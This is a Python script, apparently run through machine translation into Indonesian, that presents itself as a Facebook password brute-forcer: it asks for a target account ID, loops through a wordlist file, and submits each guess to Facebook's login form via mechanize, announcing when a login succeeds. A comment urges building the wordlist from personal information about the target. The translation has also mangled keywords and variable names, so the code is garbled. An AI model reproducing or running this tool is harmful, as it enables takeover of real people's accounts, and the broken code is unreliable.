# penulis: kham1d
# Tim: Life Of Programmer
# Klo gak ada hasrat jangan jadi programmer, koding itu berat kamu gk akan kuat ...

impor os
impor sys
waktu impor
impor acak
impor cookielib
impor mekanis

w =  " \ 033 [90m "
r =  " \ 033 [91m "
g =  " \ 033 [32m "
p =  " \ 033 [95; 1m "
b =  " \ 033 [96m "
wl =  " \ 033 [97m "

def  kham1d ( lolz ):
    untuk noobs dalam lolz +  ' \ n ' :
        sys.stdout.write (noobs)
        sys.stdout.flush ()
        time.sleep ( 10 . /  100 )

 spanduk def ():
    os.system ( ' jelas ' )
    cetak (wl + " . " )
    cetak (r + " _____ ____ ____ _ " ))
    cetak ( " | ___ | __) | __) _ __ _ _ | | _ ___ " )
    cetak (b + " | | _ | _ \ | _ \ |` __ | | | | ___ / _ \ " )
    print (wl + " | _ | | | _) | | | _) | | | _ | || __ / " )
    cetak (p + " | _ | | ____ / | ____ / | _ | \ __, _ | \ __ \ ___ | " )
   # print r + "Saran penulis: Buatlah daftar kata sendiri, sesuai dengan informasi yg bisa Anda dapat dari target FB yg mau di h @ ck"
    cetak  "  "
    kham1d (b + "    LIFEOFPROGRAMMER " )
    cetak (w + " + ---------------------------------------- + " )
    print (w + " | \ 033 [97mAuthor: \ 033 [32kham1d " )
    cetak (w + " | \ 033 [97mFacebook: \ 033 [kham1d " )
    print (w + " | \ 033 [97mTeam: \ 033 [32mLife Of Programmer " )
    cetak (w + " | \ 033 [97mGithub: \ 033 [32mhttps: //www.github.com/Khamid2 " )
    cetak (w + " + ---------------------------------------- + " )

spanduk()
email =  raw_input (r + ' [ \ 033 [97m? \ 033 [32m] Masukkan ID Target \ 033 [95m: \ 033 [96m ' )
wordlist =  terbuka ( ' pass.txt ' , ' r ' )
login =  ' https://www.facebook.com/login.php?login_attempt=1 '

user_noobs = [( ' Mozilla / 5.0 (X11; Linux x86_64; rv: 45.0) Gecko / 20100101 Firefox / 45.0 ' )]

def  main ():
		global br
		br = mechanize.Browser ()
		cj = cookielib.LWPCookieJar ()
		br.set_handle_robots ( False )
		br.set_handle_redirect ( Benar )
		br.set_cookiejar (cj)
		br.set_handle_equiv ( Benar )
		br.set_handle_referer ( Benar )
		br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1 )
                baik()
		kintil ()
def  hehe ( kata sandi ):
		sys.stdout.write ( ' \ 033 [96m [ \ 033 [91m + \ 033 [96m] \ 033 [97mPassword tidak valid \ 033 [31m ==> \ 033 [90m {} ' .format (kata sandi))
		sys.stdout.flush ()
		br.addheaders = [( ' Agen-pengguna ' , random.choice (user_noobs))]
		situs = br.open (masuk)
                br.select_form ( nr  =  0 )
		br.form [ ' email ' ] = email
		br.form [ ' pass ' ] = kata sandi
		noobs = br.submit ()
		lolz = noobs.geturl ()
		jika lolz ! = masuk dan ( bukan  ' login_attempt '  dalam lolz):
				cetak  " \ 033 [96m [#] \ 033 [95m Login Sukses Tod \ 033 [96m ... {} " .format (kata sandi)
                                cetak  "  "
                                print wl + "    == [ \ 033 [92mPassword Ditemukan ea .. ==> \ 033 [91m {} \ 033 [97m] == " .format (kata sandi)
                                cetak  "  "
                                sys.exit ()
def  kintil ():
		kata sandi global
		kata sandi =  terbuka ( ' pass.txt ' , ' r ' )
		untuk kata sandi dalam kata sandi:
				kata sandi = kata sandi. ganti ( " \ n " , " " )
				hehe (kata sandi)

def  well ():
#         print wel
        cetak  "  "
        bacot =  buka ( ' pass.txt ' , " r " )
        bacot = bacot.readlines ()
        cetak  "  "
        print w + " [#] Target Target: {}  " .format (email)
        cetak  " [#] Kata sandi Jmlah: " , len (bacot)
        print  " [#] Tunggu proses cracking password cuk ..... "
        cetak  "  "
if  __name__ == ' __main__ ' :
	utama()
